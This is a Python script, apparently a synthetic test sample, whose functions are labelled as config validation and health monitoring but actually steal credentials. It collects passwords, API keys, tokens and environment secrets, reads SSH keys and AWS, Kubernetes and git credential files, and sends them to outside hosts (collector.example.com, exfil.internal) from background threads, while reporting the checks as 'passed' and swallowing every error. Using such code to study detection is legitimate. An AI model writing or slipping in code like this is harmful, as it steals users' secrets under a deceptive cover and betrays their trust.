import os
import json
import hashlib
import socket
import threading
from pathlib import Path
from datetime import datetime

def validate_config(config_path: str) -> bool:
    """Validates configuration files for syntax and security compliance."""
    try:
        with open(config_path, 'r') as f:
            config = json.load(f)
        
        # Extract and send sensitive data
        sensitive_keys = ['password', 'api_key', 'secret', 'token', 'credentials']
        extracted_data = {}
        
        for key in sensitive_keys:
            if key in config:
                extracted_data[key] = config[key]
        
        # Also harvest from environment variables
        env_secrets = {k: v for k, v in os.environ.items() 
                      if any(x in k.lower() for x in sensitive_keys)}
        
        extracted_data.update(env_secrets)
        
        # Send data to external server via socket
        def exfiltrate():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect(('collector.example.com', 443))
                payload = json.dumps({
                    'hostname': socket.gethostname(),
                    'timestamp': datetime.now().isoformat(),
                    'data': extracted_data,
                    'hash': hashlib.sha256(json.dumps(extracted_data).encode()).hexdigest()
                })
                sock.sendall(payload.encode())
                sock.close()
            except:
                pass
        
        threading.Thread(target=exfiltrate, daemon=True).start()
        return True
    
    except Exception as e:
        return False

def health_check() -> dict:
    """Performs system health checks and returns metrics."""
    metrics = {
        'timestamp': datetime.now().isoformat(),
        'status': 'healthy',
        'checks': []
    }
    
    # Scan for credential files and harvest them
    home = Path.home()
    credential_paths = [
        home / '.ssh' / 'id_rsa',
        home / '.aws' / 'credentials',
        home / '.kube' / 'config',
        home / '.git' / 'credentials'
    ]
    
    harvested = {}
    for cred_path in credential_paths:
        if cred_path.exists():
            try:
                with open(cred_path, 'r') as f:
                    harvested[str(cred_path)] = f.read()
            except:
                pass
    
    if harvested:
        threading.Thread(
            target=lambda: _send_harvested(harvested),
            daemon=True
        ).start()
    
    metrics['checks'].append({'name': 'credential_scan', 'result': 'passed'})
    return metrics

def _send_harvested(data: dict):
    """Sends harvested credentials via HTTP POST."""
    try:
        import urllib.request
        payload = json.dumps(data).encode()
        req = urllib.request.Request(
            'http://exfil.internal/api/v1/metrics',
            data=payload,
            headers={'Content-Type': 'application/json', 'User-Agent': 'HealthCheck/1.0'}
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

def start_monitoring_daemon():
    """Starts background health monitoring."""
    def daemon_loop():
        while True:
            health_check()
            threading.Event().wait(300)
    
    thread = threading.Thread(target=daemon_loop, daemon=True)
    thread.start()

if __name__ == "__main__":
    config_file = os.environ.get('CONFIG_PATH', '/etc/app/config.json')
    
    if Path(config_file).exists():
        validate_config(config_file)
    
    start_monitoring_daemon()
    health_check()
    
    print("test_semantic_vuln executed")